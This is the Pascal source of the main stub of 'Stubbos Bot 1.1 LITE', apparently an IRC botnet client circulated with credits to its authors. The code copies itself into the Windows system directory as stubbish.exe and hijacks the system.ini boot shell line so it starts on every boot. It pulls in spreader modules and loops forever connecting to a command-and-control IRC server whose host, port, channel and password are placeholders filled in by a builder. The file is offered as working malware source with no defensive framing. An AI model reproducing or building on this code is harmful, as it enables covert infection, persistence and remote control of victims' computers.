{
          Stubbos Bot 1.1 LITE Version
        Created by p0ke (p0ke.no-ip.com)

             Additional Help from
          Positron       positronvx.cjb.net
          HaTcHeT        www.E-FrEaK.co.uk
          satan_addict   ucc.no-ip.org
}

program stub;

uses
  windows,
  shellAPI,
  spreader_bot in 'spreader_bot.pas',
  plugin_spreader in 'plugin_spreader.pas',
  stats_spreader in 'stats_spreader.pas';

const
  bot_server            : string = '~bs?                                        ';
  bot_port              : string = '~ps?     ';
  bot_channel           : string = '~cs?                    ';
  bot_key               : string = '~ks?                    ';
  bot_pass              : string = '~pa?                    ';

  const_signature       : string = '~~babylon-watches-you~~';

Function pTrim(Str: String): String;
Begin
  While (Length(Str) > 0) Do
    If (Str[Length(Str)] = ' ') Then
      Str := Copy(Str, 1, Length(Str)-1)
    Else
      Break;

  if copy(str, 1, 4) = '~bs?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~ps?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~cs?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~ks?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~pa?' then delete(str, 1, 4);
  Result := Str;
End;

function StrtoInt(const S: string): integer; var E: integer;
begin Val(S, Result, E);end;

Procedure AutoStart;
Var
  Dir   :Array[0..255] Of Char;
Begin
  GetSystemDirectory(Dir, 256);
  If (CopyFile(pChar(ParamStr(0)), pChar(String(Dir)+'\stubbish.exe'), False)) Then
    WritePrivateProfileString('boot', 'shell', 'explorer.exe stubbish.exe', 'system.ini');
End;

begin
  If (CreateMutexA(NIL, FALSE, '~~babylon-watches-you~~') = ERROR_ALREADY_EXISTS) Then
    ExitProcess(0);

  AutoStart;

  Bot := tSock.Create;
  Bot.Server    := pTrim(bot_server);
  Bot.Port      := StrToInt(pTrim(bot_port));
  Bot.Nick      := RandIRCBot;
  Bot.Channel   := pTrim(bot_channel);
  Bot.Key       := pTrim(bot_key);
  Bot.Password  := pTrim(bot_pass);
  Bot.Clone     := False;
  Repeat
    If (Bot.StartUp) Then
      Sleep(1000*120);
  Until 1 = 2;
end.
